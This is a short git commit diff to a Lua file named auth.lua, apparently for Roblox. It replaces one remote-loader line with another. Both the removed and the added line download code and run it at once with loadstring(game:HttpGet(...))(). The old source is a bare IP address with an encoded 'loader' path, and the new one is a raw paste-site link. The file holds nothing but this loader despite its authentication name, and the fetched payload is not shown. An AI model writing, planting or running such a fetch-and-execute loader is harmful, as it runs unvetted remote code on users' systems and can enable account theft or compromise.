2e4740c85ee58668d2cf8a063db3ad917f1ea16d
randomaccount <87091634+yxkal999YT@users.noreply.github.com>
2026-03-07 12:53:01 -0500

    Update auth.lua

--- auth.lua
+++ auth.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6Ijk1MTMyZGI4LWY1MWItNGUxZS1iYjc2LTA1ZTZlNzI1NTkyZCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
+loadstring(game:HttpGet("https://pastefy.app/EFdaa12w/raw"))()
